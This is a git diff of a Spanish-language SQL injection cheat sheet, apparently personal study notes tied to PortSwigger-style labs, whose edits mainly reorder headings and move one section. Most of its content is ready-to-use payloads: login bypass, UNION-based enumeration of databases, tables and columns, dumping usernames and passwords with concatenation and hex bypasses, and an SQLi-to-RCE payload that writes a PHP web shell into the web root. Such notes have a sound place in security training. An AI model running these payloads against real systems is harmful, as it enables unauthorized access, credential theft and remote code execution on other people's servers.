@@ -1,11 +1,7 @@
-# ¿Qué son las SQL Injection?
-Método de infiltración en el que se usa SQL con el fin de obtener una información privilegiada, bypasear un panel etc...
 
-
-# ¿En que momento se deben utilizar?
 Variable a cambiar --> $WORD
 
-### Vulnerabilty in where cluase allowing retrieval of hidden data
+# Vulnerabilty in where cluase allowing retrieval of hidden data
 
 ````sql
 $WORD' or 1=1-- -
@@ -23,7 +19,7 @@ Ej:
 Filtrame por la categoría accesorios o 1=1 (que es true)
 ![[Pasted image 20230122162356.png]]
 
-### Vulnerability allowing login bypass
+# Vulnerability allowing login bypass
 ````sql
 administrator'-- -
 o
@@ -42,7 +38,7 @@ Así que estamos diciendo que cuando el usuario sea válido podremos entrar
 Si pide la contraseña puede que sea por la validación de la parte de front-end, se pone cualquier cosa y listo
 ![[Pasted image 20230122165427.png]]
 
-### Union Attack, determing the number of columns returned by the query 
+# Union Attack, determing the number of columns returned by the query 
 
 El primer paso es **averiguar el número de columnas**
 
@@ -86,15 +82,7 @@ Puede que en algunas webs se interprete php y podamos poner comandos ("\<?php sy
 ==Atención!==
 **No todos los campos son válidos/inyectables** para introducir los comandos, tenemos que fuzzear  todos los campos para ver cuál es el válido
 
-##### SQLI --> RCE
-
-**Si tenemos permiso de escritura** incluso podemos colar archivos:
-````sql
-$WORD' union select <?php system('whoami'); ?>,"test" into outfile "/var/www/html/COMANDO.php"-- -
-````
-La ruta no tiene porque ser está, eso tendríamos que investigar cual sería
-
-#### Listar BD
+## Listar BD
 
 **Ver las bases de datos disponibles**
 ````sql
@@ -122,7 +110,7 @@ $WORD' union select 1,schema_name from information_schema.schemata limit 0,1-- -
 $WORD' union select schema_name,null from information_schema.schemata-- -
 ````
 
-#### Listar tablas
+## Listar tablas
 
 Una vez conozcamos las bases de datos tenemos que **averiguar las columnas/filas de estas**
 
@@ -136,13 +124,13 @@ Para que no pase esto podemos utilizar where:
 $WORD' union select table_name,null from information_schema.tables where table_schema='public'-- -
 ````
 
-#### Listar Columnas
+## Listar Columnas
 Ahora que conocemos las tablas queremos **dumpear las columnas**
 ````sql
 $WORD' union select column_name,null from information_schema.columns where table_schema='NombreBaseDeDatos' and table_name='NombreTablaAListar' -- -
 ````
 
-#### Ver campos y datos
+## Ver campos y datos
 Si lo permite podemos utilizar los dos campos para que un lado aparezca el nombre y en otro aparezca la contraseña:
 ````sql
 $WORD' union select username, password from users-- -
@@ -158,13 +146,13 @@ En caso de que sea otra base de datos la que contiene estos campos tendríamos q
 $WORD' union select null, concat(username,':',password) from OtraTabla.users-- -
 ````
 
-##### Otra forma de concatenar la información (Bypassing con pipes || )
+### Otra forma de concatenar la información (Bypassing con pipes || )
 Si no permite la anterior podemos probar así:
 ````sql
 $WORD' union select null, username||':'||password from users-- -
 ````
 
-##### Bypassing cadenas de caracteres con hexadecimal
+### Bypassing cadenas de caracteres con hexadecimal
 Si no deja poner una cadena de separatoria (como son los : puedes poner su valor en **hexadecimal**):
 ````sql
 $WORD' union select null, concat(username,'0x3a',password) from users-- -
@@ -178,6 +166,13 @@ Con el tr -d '\n' le estamos quitando el salto de línea para que se represente
 
 En caso de que no dejará podriamos ir a la [cheat sheet de portswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
+### SQLI --> RCE
+
+**Si tenemos permiso de escritura** incluso podemos colar archivos:
+````sql
+$WORD' union select <?php system('whoami'); ?>,"test" into outfile "/var/www/html/COMANDO.php"-- -
+````
+La ruta no tiene porque ser está, esto tendríamos que investigar cual sería
 
 Vídeo de s4vi --> 1:13:20
 
